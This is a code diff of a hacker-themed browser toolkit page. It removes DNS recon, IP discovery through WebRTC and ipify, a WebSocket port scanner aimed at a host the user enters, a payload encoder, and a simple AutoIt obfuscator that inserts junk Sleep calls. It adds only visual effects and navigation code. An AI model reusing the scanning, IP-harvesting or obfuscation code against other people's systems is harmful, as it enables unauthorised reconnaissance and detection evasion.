-  try {
-    const data=await realDNSQuery(domain,type);
-    hideScanProgress();
-    const ts=new Date().toLocaleTimeString('en',{hour12:false});
-    if(out.textContent.startsWith('// No scans run yet')) out.innerHTML='';
-    let result=`<div style="color:var(--cyan);font-size:.68rem;margin-bottom:.4rem">[${ts}] DNS RECON — ${domain} [${type}] via Cloudflare DoH (REAL)</div>`;
-    if(data&&data.Answer&&data.Answer.length) {
-      data.Answer.forEach(r=>{ result+=`<div class="row real-result"><span class="text-g">${r.name}</span><span class="badge badge-c">${r.type===1?'A':r.type===28?'AAAA':r.type===15?'MX':r.type===16?'TXT':r.type===5?'CNAME':r.type===2?'NS':'TYPE'+r.type}</span><span>${r.data}</span><span class="text-muted" style="font-size:.62rem">TTL:${r.TTL}s</span></div>`; });
-      document.getElementById('sc-threats').textContent=data.Answer.length;
-    } else if(data&&data.Authority) {
-      result+=`<div class="row real-result"><span class="text-amber">No direct answer — Authority records returned.</span></div>`;
-      data.Authority.forEach(r=>{ result+=`<div class="row real-result"><span>${r.name}</span><span>${r.data}</span></div>`; });
+  function draw() {
+    if (S.settings.rain) {
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.08)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      
+      ctx.fillStyle = '#00ff41';
+      ctx.font = fontSize + 'px monospace';
+      
+      for (let i = 0; i < rainDrops.length; i++) {
+        const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+        ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
+        
+        if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+          rainDrops[i] = 0;
+        }
+        rainDrops[i]++;
+      }
     } else {
-      result+=`<div class="row real-result"><span class="text-amber">No records found for ${domain} [${type}]</span></div>`;
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
     }
-    out.innerHTML+=result; out.scrollTop=out.scrollHeight;
-    incStat('scans'); toast(`DNS lookup: ${domain} — ${(data&&data.Answer||[]).length} record(s)`,'ok');
-  } catch(e) { hideScanProgress(); toast('DNS lookup failed: '+e.message,'err'); logFeed('DNS error: '+e.message,'tl-err'); }
-}
-
-async function realDNSQuery(domain,type='A') {
-  try {
-    const r=await fetch(`https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(domain)}&type=${type}`,{headers:{'Accept':'application/dns-json'}});
-    return await r.json();
-  } catch {
-    try {
-      const r=await fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=${type}`);
-      return await r.json();
-    } catch(e){ throw new Error('Both Cloudflare and Google DNS unreachable: '+e.message); }
-  }
-}
-
-// ═══════════════════════════════════════════════
-//  NETWORK TAB — REAL IMPLEMENTATION
-// ═══════════════════════════════════════════════
-
-async function refreshNetworkInfo() {
-  logNet('Refreshing network info…','tl-info');
-  // External IP
-  const extEl=document.getElementById('net-ext-ip');
-  if(extEl){ extEl.textContent='Fetching…'; extEl.className='stat-val green'; }
-  try {
-    const r=await fetch('https://api.ipify.org?format=json',{signal:AbortSignal.timeout(6000)});
-    const d=await r.json();
-    if(extEl) extEl.textContent=d.ip;
-    logNet(`External IP: ${d.ip}`,'tl-ok');
-  } catch(e) {
-    try {
-      const r=await fetch('https://api64.ipify.org?format=json',{signal:AbortSignal.timeout(4000)});
-      const d=await r.json(); if(extEl) extEl.textContent=d.ip;
-    } catch{ if(extEl) extEl.textContent='Unavailable'; logNet('External IP fetch failed','tl-warn'); }
-  }
-  // Local IP via WebRTC
-  const localEl=document.getElementById('net-local-ip');
-  if(localEl) localEl.textContent='Detecting…';
-  try {
-    const ips=await getLocalIPsWebRTC();
-    if(localEl) localEl.textContent=ips.join(', ')||'None found';
-    logNet(`Local IPs: ${ips.join(', ')}`,'tl-ok');
-  } catch(e) { if(localEl) localEl.textContent='N/A'; }
-  // Connection info
-  const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
-  const typeEl=document.getElementById('net-conn-type'); const rttEl=document.getElementById('net-latency');
-  if(conn) {
-    if(typeEl) typeEl.textContent=(conn.effectiveType||conn.type||'unknown').toUpperCase();
-    if(rttEl) rttEl.textContent=(conn.rtt?conn.rtt+'ms':'N/A');
-    updateNetDetails(conn);
-    logNet(`Connection: ${conn.effectiveType||conn.type||'unknown'} · RTT: ${conn.rtt||'?'}ms · DL: ${conn.downlink||'?'}Mbps`,'tl-ok');
-  } else {
-    if(typeEl) typeEl.textContent='N/A';
-    if(rttEl) rttEl.textContent='N/A';
-    updateNetDetails(null);
-  }
-  // Ping test
-  pingTest();
-}
-
-function updateNetDetails(conn) {
-  const panel=document.getElementById('netDetailsPanel'); if(!panel) return;
-  panel.innerHTML='';
-  const addRow=(label,val,color='')=>{ const el=document.createElement('div'); el.className='flex justify-between'; el.innerHTML=`<span class="text-muted">${label}</span><span ${color?`style="color:${color}"`:''}>${val}</span>`; panel.appendChild(el); const hr=document.createElement('hr'); panel.appendChild(hr); };
-  if(conn) {
-    addRow('Connection Type',conn.effectiveType||conn.type||'N/A','var(--cyan)');
-    addRow('Downlink',conn.downlink?conn.downlink+' Mbps':'N/A','var(--g)');
-    addRow('RTT',conn.rtt?conn.rtt+' ms':'N/A','var(--amber)');
-    addRow('Save Data',conn.saveData?'Enabled':'Disabled');
-  } else {
-    addRow('Network Info API','Not Supported','var(--amber)');
-  }
-  addRow('User Agent',navigator.userAgent.substr(0,50)+'…','var(--muted)');
-  addRow('Language',navigator.language||'N/A');
-  addRow('Platform',navigator.platform||'N/A');
-  addRow('Online Status',navigator.onLine?'Online':'Offline',navigator.onLine?'var(--g)':'var(--red)');
-  addRow('Cookies',navigator.cookieEnabled?'Enabled':'Disabled');
-  addRow('Web Bluetooth',navigator.bluetooth?'Supported':'Not Supported',navigator.bluetooth?'var(--g)':'var(--amber)');
-  addRow('Service Workers','serviceWorker' in navigator?'Supported':'Not Supported');
-}
-
-async function pingTest() {
-  const rttEl=document.getElementById('net-latency'); if(!rttEl) return;
-  try {
-    const start=performance.now();
-    await fetch('https://api.ipify.org?format=json',{signal:AbortSignal.timeout(5000)});
-    const rtt=Math.round(performance.now()-start);
-    rttEl.textContent=rtt+'ms';
-    rttEl.style.color=rtt<100?'var(--g)':rtt<300?'var(--amber)':'var(--red)';
-    logNet(`Ping: ${rtt}ms`,'tl-ok');
-  } catch(e){ rttEl.textContent='Timeout'; }
-}
-
-async function getLocalIPsWebRTC() {
-  return new Promise((resolve,reject)=>{
-    const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun1.l.google.com:19302'}]});
-    pc.createDataChannel('');
-    const ips=new Set();
-    pc.onicecandidate=e=>{
-      if(!e.candidate){ pc.close(); resolve([...ips]); return; }
-      const cand=e.candidate.candidate; const parts=cand.split(' ');
-      if(parts[4]&&/^\d+\.\d+\.\d+\.\d+$/.test(parts[4])) ips.add(parts[4]);
-      if(parts[4]&&parts[4].includes(':')) ips.add(parts[4]); // IPv6
-    };
-    pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(reject);
-    setTimeout(()=>{ pc.close(); resolve([...ips]); },4000);
-  });
-}
-
-async function runWebRTCLeakTest() {
-  const el=document.getElementById('webrtcLeaks'); if(!el) return;
-  el.innerHTML='<div class="tl-line tl-info"><span>Gathering ICE candidates…</span></div>';
-  try {
-    const ips=await getLocalIPsWebRTC();
-    el.innerHTML='';
-    if(ips.length) {
-      const ts=new Date().toLocaleTimeString('en',{hour12:false});
-      ips.forEach(ip=>{ const li=document.createElement('div'); li.className='tl-line tl-ok'; li.innerHTML=`<span class="tl-ts">[${ts}]</span><span>IP Leaked: ${ip} ${ip.startsWith('192.168')||ip.startsWith('10.')||ip.startsWith('172.')?'(Private)':'(Public)'}</span>`; el.appendChild(li); });
-      toast(`WebRTC leak: ${ips.length} IP(s) exposed!`,'warn');
-      document.getElementById('net-local-ip').textContent=ips[0];
-    } else {
-      el.innerHTML='<div class="tl-line tl-ok"><span>No IP leak detected via WebRTC</span></div>';
-      toast('No WebRTC IP leak detected','ok');
-    }
-  } catch(e){ el.innerHTML=`<div class="tl-line tl-err"><span>Error: ${e.message}</span></div>`; }
-}
-
-// Localhost Port Scanner via WebSocket
-const PORT_SERVICES={21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',80:'HTTP',110:'POP3',143:'IMAP',443:'HTTPS',445:'SMB',3306:'MySQL',3389:'RDP',5432:'PostgreSQL',5900:'VNC',6379:'Redis',8080:'HTTP-Alt',8443:'HTTPS-Alt',9200:'Elasticsearch',27017:'MongoDB'};
-const SCAN_PORTS=[21,22,23,25,53,80,110,143,443,445,3306,3389,5432,5900,6379,8080,8443,9200,27017];
-
-function getServiceName(port) { return PORT_SERVICES[port]||'Unknown'; }
-
-async function scanPort(host,port,timeout=1200) {
-  return new Promise(resolve=>{
-    const ws=new WebSocket(`ws://${host}:${port}`);
-    const t=setTimeout(()=>{ ws.close(); resolve({port,status:'filtered',service:getServiceName(port)}); },timeout);
-    ws.onopen=()=>{ clearTimeout(t); ws.close(); resolve({port,status:'open',service:getServiceName(port)}); };
-    ws.onerror=()=>{ clearTimeout(t); resolve({port,status:'closed',service:getServiceName(port)}); };
-  });
-}
-
-async function runLocalPortScan() {
-  const host=(document.getElementById('portSweepTarget')||{value:'127.0.0.1'}).value||'127.0.0.1';
-  const grid=document.getElementById('portSweepResults'); const btn=document.getElementById('portScanBtn'); const spinner=document.getElementById('portScanSpinner');
-  if(!grid) return;
-  grid.innerHTML=''; if(btn) btn.disabled=true; if(spinner) spinner.style.display='';
-  logNet(`Port sweep: ${host} (${SCAN_PORTS.length} ports)…`,'tl-info');
-  toast(`Scanning ${host}…`,'info');
-  let openCount=0;
-  for(const port of SCAN_PORTS) {
-    const cell=document.createElement('div'); cell.className='port-cell scanning'; cell.innerHTML=`<div class="port-num">${port}</div><div class="port-svc">${getServiceName(port)}</div><div class="port-status">…</div>`;
-    grid.appendChild(cell);
-    const result=await scanPort(host,port,1000);
-    cell.classList.remove('scanning'); cell.classList.add(result.status);
-    cell.querySelector('.port-status').textContent=result.status.toUpperCase();
-    if(result.status==='open') { openCount++; logNet(`Port ${port} (${result.service}): OPEN`,'tl-ok'); }
-  }
-  if(btn) btn.disabled=false; if(spinner) spinner.style.display='none';
-  toast(`Port sweep complete: ${openCount} open port(s) on ${host}`,'ok');
-  logNet(`Sweep done: ${openCount}/${SCAN_PORTS.length} open`,'tl-ok');
-  incStat('scans');
-}
-
-async function runNetDNS() {
-  const domain=(document.getElementById('netDnsInput')||{value:''}).value.trim()||'cloudflare.com';
-  const type=(document.getElementById('netDnsType')||{value:'A'}).value||'A';
-  const out=document.getElementById('netDnsResults'); if(!out) return;
-  out.innerHTML='Querying…';
-  try {
-    const data=await realDNSQuery(domain,type); let result='';
-    if(data&&data.Answer&&data.Answer.length) {
-      data.Answer.forEach(r=>{ result+=`<div class="row real-result"><span class="text-g">${r.name}</span><span class="badge badge-c">${type}</span><span>${r.data}</span><span class="text-muted" style="font-size:.6rem">TTL:${r.TTL}s</span></div>`; });
-      result=`<div style="color:var(--g-dim);font-size:.65rem;margin-bottom:.4rem">DNS: ${domain} [${type}] — ${data.Answer.length} record(s)</div>`+result;
-    } else { result=`<div class="row"><span class="text-amber">No records found for ${domain} [${type}]</span></div>`; }
-    out.innerHTML=result; logNet(`DNS ${domain} [${type}]: ${(data&&data.Answer||[]).length} records`,'tl-ok');
-  } catch(e){ out.innerHTML=`<div class="row"><span class="text-red">Error: ${e.message}</span></div>`; }
-}
-
-function exportNetworkReport() {
-  const extIP=document.getElementById('net-ext-ip').textContent;
-  const localIP=document.getElementById('net-local-ip').textContent;
-  const connType=document.getElementById('net-conn-type').textContent;
-  const latency=document.getElementById('net-latency').textContent;
-  const report=`LENLU SC v3.0 — Network Report\n${'='.repeat(40)}\nGenerated: ${new Date().toLocaleString()}\nSession: ${S.sessionId}\n\nEXTERNAL IP: ${extIP}\nLOCAL IP   : ${localIP}\nCONN TYPE  : ${connType}\nLATENCY    : ${latency}\n\nUser-Agent: ${navigator.userAgent}\nLanguage: ${navigator.language}\nPlatform: ${navigator.platform}\nOnline: ${navigator.onLine}\nBluetooth: ${!!navigator.bluetooth}\n`;
-  downloadTxt(report,'lenlu_network_report.txt');
-}
-
-// ═══════════════════════════════════════════════
-//  ENCODER TAB
-// ═══════════════════════════════════════════════
-function setEncMode(mode,btn) {
-  S.encMode=mode;
-  document.querySelectorAll('.enc-mode-btn').forEach(b=>b.classList.remove('active'));
-  if(btn) btn.classList.add('active');
-}
-function encodePayload() {
-  const input=document.getElementById('encInput').value; const out=document.getElementById('encOutput');
-  let result='';
-  try {
-    switch(S.encMode) {
-      case 'base64': result=btoa(unescape(encodeURIComponent(input))); break;
-      case 'hex': result=Array.from(new TextEncoder().encode(input)).map(b=>b.toString(16).padStart(2,'0')).join(' '); break;
-      case 'url': result=encodeURIComponent(input); break;
-      case 'rot13': result=input.replace(/[a-zA-Z]/g,c=>{const base=c<='Z'?65:97; return String.fromCharCode((c.charCodeAt(0)-base+13)%26+base);}); break;
-      case 'html': result=input.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); break;
-      case 'charcode': result=Array.from(input).map(c=>c.charCodeAt(0)).join(','); break;
-      case 'binstr': result=Array.from(new TextEncoder().encode(input)).map(b=>b.toString(2).padStart(8,'0')).join(' '); break;
-      case 'morse': const MORSE={A:'.-',B:'-...',C:'-.-.',D:'-..',E:'.',F:'..-.',G:'--.',H:'....',I:'..',J:'.---',K:'-.-',L:'.-..',M:'--',N:'-.',O:'---',P:'.--.',Q:'--.-',R:'.-.',S:'...',T:'-',U:'..-',V:'...-',W:'.--',X:'-..-',Y:'-.--',Z:'--..',0:'-----',1:'.----',2:'..---',3:'...--',4:'....-',5:'.....',6:'-....',7:'--...',8:'---..',9:'----.','.':'.-.-.-',',':'--..--','?':'..--..','/':'-..-.','-':'-....-',' ':'/'};
-        result=input.toUpperCase().split('').map(c=>MORSE[c]||'').join(' '); break;
-      default: result=input;
-    }
-    out.value=result;
-    document.getElementById('encOutLen').textContent=result.length;
-    document.getElementById('encOutBytes').textContent=new TextEncoder().encode(result).length;
-    analyzePayload();
-  } catch(e){ toast('Encode error: '+e.message,'err'); }
-}
-
-function decodePayload() {
-  const input = document.getElementById('encOutput').value;
-  const out = document.getElementById('encInput');
-  let result = '';
-  try {
-    switch(S.encMode) {
-      case 'base64': result = decodeURIComponent(escape(atob(input))); break;
-      case 'hex': result = input.split(' ').map(h => String.fromCharCode(parseInt(h, 16))).join(''); break;
-      case 'url': result = decodeURIComponent(input); break;
-      case 'rot13': result = input.replace(/[a-zA-Z]/g, c => { const base = c <= 'Z' ? 65 : 97; return String.fromCharCode((c.charCodeAt(0) - base + 13) % 26 + base); }); break;
-      case 'html': result = input.replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#39;/g, "'"); break;
-      case 'charcode': result = input.split(',').map(c => String.fromCharCode(parseInt(c, 10))).join(''); break;
-      case 'binstr': result = input.split(' ').map(b => String.fromCharCode(parseInt(b, 2))).join(''); break;
-      case 'morse': 
-        const MORSE_REV = {'.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E','..-.':'F','--.':'G','....':'H','..':'I','.---':'J','-.-':'K','.-..':'L','--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q','.-.':'R','...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y','--..':'Z','-----':'0','.----':'1','..---':'2','...--':'3','....-':'4','.....':'5','-....':'6','--...':'7','---..':'8','----.':'9','.-.-.-':'.','--..--':',','..--..':'?','-..-.':'/','-....-':'-','/':' '};
-        result = input.split(' ').map(c => MORSE_REV[c] || '').join(''); break;
-      default: result = input;
-    }
-    out.value = result;
-    analyzePayload();
-    toast('Payload decoded', 'ok');
-  } catch(e) { toast('Decode error: ' + e.message, 'err'); }
-}
-
-function analyzePayload() {
-  const input = document.getElementById('encInput').value;
-  const el = document.getElementById('encAnalysis');
-  if(!input) {
-    el.innerHTML = '<div class="text-muted">Enter text to analyze…</div>';
-    return;
-  }
-  const bytes = new TextEncoder().encode(input).length;
-  const words = input.split(/\s+/).filter(Boolean).length;
-  
-  el.innerHTML = `
-    <div class="flex justify-between"><span>Length</span><span class="text-g">${input.length} chars</span></div>
-    <div class="flex justify-between"><span>Size</span><span class="text-cyan">${bytes} bytes</span></div>
-    <div class="flex justify-between"><span>Words</span><span class="text-amber">${words}</span></div>
-    <div class="flex justify-between"><span>Lines</span><span class="text-white">${input.split('\n').length}</span></div>
-  `;
-}
-
-function swapEncIO() {
-  const input = document.getElementById('encInput');
-  const output = document.getElementById('encOutput');
-  const temp = input.value;
-  input.value = output.value;
-  output.value = temp;
-  analyzePayload();
-}
-
-function copyEncOutput() {
-  const val = document.getElementById('encOutput').value;
-  if(!val) return;
-  navigator.clipboard.writeText(val).then(() => toast('Encoded payload copied', 'ok'));
-}
-
-function sendEncToCompiler() {
-  const val = document.getElementById('encOutput').value;
-  const ed = document.getElementById('srcEditor');
-  if(ed && val) {
-    ed.value = val;
-    updateEditorCounts();
-    switchView('compiler', document.querySelector('[data-view=compiler]'));
-    toast('Payload pushed to compiler IDE', 'ok');
-  }
-}
-
-function obfuscateAu3() {
-  let code = document.getElementById('outViewer').textContent;
-  if(!code || code.includes('Compiled assembly will appear here')) {
-    toast('No assembly code to obfuscate. Compile first.', 'warn');
-    return;
   }
   
-  const obfVars = document.getElementById('obfVars').checked;
-  const obfJunk = document.getElementById('obfJunk').checked;
-  
-  // Simple heuristic obfuscation demonstration
-  let lines = code.split('\n');
-  if(obfJunk) {
-    lines = lines.map(line => {
-      return line + (Math.random() > 0.7 && line.trim() !== '' && !line.startsWith(';') ? `\nSleep(${Math.floor(Math.random() * 10)})` : '');
+  setInterval(draw, 33);
+}
+
+// GSAP Reveal Animations
+function initStudioAnimations() {
+  if (typeof gsap !== 'undefined') {
+    gsap.from('.reveal-up', {
+      opacity: 0,
+      y: 40,
+      duration: 1,
+      stagger: 0.15,
+      ease: 'power3.out'
     });
   }
   
-  document.getElementById('outViewer').textContent = lines.join('\n');
-  updateOutCounts(lines.join('\n'));
-  logIDE('AutoIt3 assembly obfuscated', 'tl-ok');
-  toast('Assembly obfuscated successfully', 'ok');
-}
-
-// ─── PAYLOAD TOOLS ───
-async function generateHashes() {
-  const text = document.getElementById('hashInput').value;
-  const out = document.getElementById('hashOutput');
-  if(!text) { out.innerHTML = ''; return; }
+  const scroller = document.querySelector('.horizontal-scroll-container');
+  if (scroller) {
+    scroller.addEventListener('wheel', e => {
+      if (e.deltaY !== 0) {
+        e.preventDefault();
+        scroller.scrollLeft += e.deltaY * 1.2;
+      }
+    }, { passive: false });
+  }
   
-  const buffer = new TextEncoder().encode(text);
-  const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
-  const hashArray = Array.from(new Uint8Array(hashBuffer));
-  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-  
-  out.innerHTML = `
-    <div class="flex justify-between items-center gap-sm">
-      <span class="text-muted">SHA-256:</span>
-      <span class="text-cyan truncate" style="flex:1; user-select:all;">${hashHex}</span>
-    </div>
-  `;
+  // Trigger background systems
+  initStars();
+  initRain();
 }
 
-function genRandomKey() {
-  const arr = new Uint8Array(32);
-  crypto.getRandomValues(arr);
-  document.getElementById('payloadToolOut').textContent = Array.from(arr).map(b => b.toString(16).padStart(2, '0')).join('');
+// 3D Tilt Cards effect
+function initTiltCards() {
+  const cards = document.querySelectorAll('.tilt-card');
+  cards.forEach(card => {
+    card.style.transition = 'transform 0.4s var(--ease), box-shadow 0.4s var(--ease)';
+    card.addEventListener('mousemove', e => {
+      const rect = card.getBoundingClientRect();
+      const x = e.clientX - rect.left;
+      const y = e.clientY - rect.top;
+      const xc = rect.width / 2;
+      const yc = rect.height / 2;
+      const rotateX = (yc - y) / 12;
+      const rotateY = (x - xc) / 12;
+      
+      card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.02, 1.02, 1.02)`;
+      card.style.boxShadow = `0 15px 35px rgba(0, 255, 65, 0.15)`;
+    });
+    
+    card.addEventListener('mouseleave', () => {
+      card.style.transform = `perspective(1000px) rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1)`;
+      card.style.boxShadow = '';
+    });
+  });
 }
-
-function genUUID() {
-  document.getElementById('payloadToolOut').textContent = crypto.randomUUID ? crypto.randomUUID() : 'Requires Secure Context (HTTPS)';
-}
-
-function genMACAddr() {
-  document.getElementById('payloadToolOut').textContent = rndMAC();
-}
-
-
-// ─── STUBS FOR INITIALIZATION (To prevent console errors) ───
-function initHoloRing() {}
-function initStudioAnimations() {}
-function initTiltCards() {}
-function buildDuckRef() {}
-function buildAITags() {}
-function renderVault() {}
-function renderHistory() {}
-function openModal(id) { document.getElementById(id).classList.add('open'); }
-function closeModal(id) { document.getElementById(id).classList.remove('open'); }
-function startSpectrum() {}
-function animateTelemetry() {}
 
 // ─── INITIALIZATION BOOTSTRAP ───
 window.onload = () => {
@@ -2752,6 +957,28 @@ window.onload = () => {
     bootEnter();
   }
 };
+
+document.querySelectorAll('[data-nav-link]').forEach(link => {
+  link.addEventListener('click', event => {
+    event.preventDefault();
+    const targetId = link.getAttribute('href')?.slice(1);
+    const target = targetId ? document.getElementById(targetId) : null;
+    const mainScroll = document.querySelector('.main');
+    if (target && mainScroll) {
+      const offset = target.offsetTop - 84;
+      mainScroll.scrollTo({ top: Math.max(offset, 0), behavior: 'smooth' });
+    }
+
+    document.querySelectorAll('[data-nav-link]').forEach(item => item.classList.remove('active'));
+    link.classList.add('active');
+
+    const collapseEl = document.getElementById('lenluNavbar');
+    if (collapseEl && window.bootstrap?.Collapse && collapseEl.classList.contains('show')) {
+      window.bootstrap.Collapse.getOrCreateInstance(collapseEl).hide();
+    }
+  });
+});
 </script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1N7N6jIeHz" crossorigin="anonymous"></script>
 </body>
 </html>
